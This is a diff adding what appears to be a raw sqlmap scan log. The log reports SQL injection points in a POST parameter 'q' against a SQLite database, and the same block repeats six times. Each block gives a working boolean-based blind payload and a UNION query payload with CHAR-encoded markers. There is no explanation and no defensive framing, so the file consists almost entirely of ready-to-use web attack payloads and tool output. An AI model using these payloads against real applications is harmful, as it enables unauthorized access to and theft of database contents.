@@ -1,0 +1,72 @@
+sqlmap identified the following injection point(s) with a total of 234 HTTP(s) requests:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=test' OR NOT 2107=2107-- ycpG
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT CHAR(113,98,122,112,113)||CHAR(105,79,83,117,117,106,69,67,109,88,107,77,119,98,110,76,121,120,79,99,77,71,70,78,122,106,107,115,118,73,99,111,104,74,102,101,122,118,84,99)||CHAR(113,112,98,122,113),NULL-- phkM
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=test' OR NOT 2107=2107-- ycpG
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT CHAR(113,98,122,112,113)||CHAR(105,79,83,117,117,106,69,67,109,88,107,77,119,98,110,76,121,120,79,99,77,71,70,78,122,106,107,115,118,73,99,111,104,74,102,101,122,118,84,99)||CHAR(113,112,98,122,113),NULL-- phkM
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=test' OR NOT 2107=2107-- ycpG
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT CHAR(113,98,122,112,113)||CHAR(105,79,83,117,117,106,69,67,109,88,107,77,119,98,110,76,121,120,79,99,77,71,70,78,122,106,107,115,118,73,99,111,104,74,102,101,122,118,84,99)||CHAR(113,112,98,122,113),NULL-- phkM
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=test' OR NOT 2107=2107-- ycpG
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT CHAR(113,98,122,112,113)||CHAR(105,79,83,117,117,106,69,67,109,88,107,77,119,98,110,76,121,120,79,99,77,71,70,78,122,106,107,115,118,73,99,111,104,74,102,101,122,118,84,99)||CHAR(113,112,98,122,113),NULL-- phkM
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=test' OR NOT 2107=2107-- ycpG
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT CHAR(113,98,122,112,113)||CHAR(105,79,83,117,117,106,69,67,109,88,107,77,119,98,110,76,121,120,79,99,77,71,70,78,122,106,107,115,118,73,99,111,104,74,102,101,122,118,84,99)||CHAR(113,112,98,122,113),NULL-- phkM
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=test' OR NOT 2107=2107-- ycpG
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT CHAR(113,98,122,112,113)||CHAR(105,79,83,117,117,106,69,67,109,88,107,77,119,98,110,76,121,120,79,99,77,71,70,78,122,106,107,115,118,73,99,111,104,74,102,101,122,118,84,99)||CHAR(113,112,98,122,113),NULL-- phkM
+---
+back-end DBMS: SQLite
